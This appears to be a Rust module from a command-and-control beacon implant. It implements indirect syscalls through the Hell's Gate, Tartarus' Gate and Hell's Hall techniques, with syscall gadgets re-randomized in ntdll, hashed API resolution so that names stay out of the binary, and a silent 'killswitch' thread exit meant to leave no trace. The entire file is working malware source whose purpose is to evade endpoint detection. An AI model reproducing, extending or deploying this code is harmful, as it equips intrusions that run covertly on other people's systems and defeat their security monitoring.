//! Indirect syscall glue (port of the syscall paths of
//! `src_beacon/src/runtime/`).
//!
//! The pure logic (SSN extraction, Tartarus' Gate interpolation, gadget
//! scan, rotation) lives in `specter_core::syscalls`, host-tested. This
//! module holds only the Windows x64 assembly indirection and the
//! instance-held syscall table — nothing here is host-testable, so it is
//! kept to the strict minimum and reviewed by hand.
//!
//! Hell's Hall contract: the `syscall` instruction is never executed from
//! beacon memory; it runs from a `0F 05 C3` gadget inside ntdll's own
//! `.text`, re-randomized every sleep cycle by the caller.

use core::ffi::c_void;

use specter_core::peb;
use specter_core::syscalls::{self, ZwStubs, MAX_GADGETS};

/// Per-instance syscall state (Hell's Gate table + Hell's Hall gadgets).
pub struct Syscalls {
    /// SSN of NtDelayExecution (direct or interpolated).
    pub delay_ssn: u32,
    /// `syscall; ret` gadget offsets within ntdll's `.text`.
    pub gadget_offsets: [u32; MAX_GADGETS],
    pub gadget_count: usize,
    /// ntdll `.text` base: absolute gadget address = base + offset.
    pub text_base: *const u8,
}

/// Build the syscall table from a resolved ntdll: gadget scan over `.text`
/// (Hell's Hall) and SSN resolution for NtDelayExecution (Hell's Gate with
/// Tartarus' Gate fallback). `None` = the beacon cannot operate.
///
/// # Safety
///
/// `ntdll` must be a resolved ntdll base with intact headers.
pub unsafe fn build(ntdll: *mut c_void) -> Option<Syscalls> {
    let (text, len) = peb::find_section(ntdll, b".text")?;
    if text.is_null() || len < 3 {
        return None;
    }
    let text_bytes = core::slice::from_raw_parts(text, len);

    let mut gadget_offsets = [0u32; MAX_GADGETS];
    let gadget_count = syscalls::find_gadgets(text_bytes, &mut gadget_offsets);
    if gadget_count == 0 {
        return None; // a real ntdll always contains syscall; ret stubs
    }

    // Nt* and Zw* exports share one stub: either name resolves it. Const:
    // the hash is folded at compile time and the string never lands in the
    // blob (same discipline as the original's hash.py constants).
    const DELAY_EXECUTION: (u64, u64) = syscalls::hash_nt_or_zw("NtDelayExecution");
    let mut target = peb::find_export(ntdll, DELAY_EXECUTION.0);
    if target.is_null() {
        target = peb::find_export(ntdll, DELAY_EXECUTION.1);
    }
    if target.is_null() {
        return None;
    }
    let target_rva = (target as usize - ntdll as usize) as u32;

    // Hell's Gate direct extraction with Tartarus' Gate fallback.
    let mut zw = ZwStubs::new();
    syscalls::collect_zw_stubs(ntdll, &mut zw);
    let delay_ssn = syscalls::resolve_ssn(target_rva, &zw.stubs[..zw.count])?;

    Some(Syscalls {
        delay_ssn,
        gadget_offsets,
        gadget_count,
        text_base: text,
    })
}

/// Absolute gadget address for a rotation draw.
#[inline]
pub fn gadget(sys: &Syscalls, index: usize) -> *const c_void {
    unsafe { sys.text_base.add(sys.gadget_offsets[index] as usize) as *const c_void }
}

/// Execute an indirect syscall with 2 register arguments (Microsoft x64
/// ABI: RCX, RDX — the stub moves RCX to R10 for the syscall ABI).
/// The status (NTSTATUS) is returned in RAX.
///
/// # Safety
///
/// `ssn` must be a valid syscall number for the running kernel and
/// `gadget` a `syscall; ret` address inside ntdll.
#[inline(always)]
pub unsafe fn indirect_syscall2(ssn: u32, gadget: *const c_void, rcx: usize, rdx: usize) -> i32 {
    let status: i32;
    core::arch::asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "call r11",
        ssn = in(reg) ssn,
        in("r11") gadget,
        in("rcx") rcx,
        in("rdx") rdx,
        lateout("rax") status,
        clobber_abi("system"),
    );
    status
}

/// Silent exit through `RtlExitUserThread(0)` resolved by hash: no error, no
/// check-in, no trace (same contract as the original killswitch exit).
///
/// # Safety
///
/// The pointer must be a resolved `RtlExitUserThread`.
#[cold]
#[inline(never)]
pub unsafe fn exit_thread(exit: unsafe extern "system" fn(u32)) -> ! {
    exit(0);
    // RtlExitUserThread never returns; this loop only satisfies the type
    // checker and acts as a frozen fallback should it ever return.
    loop {
        core::hint::spin_loop();
    }
}
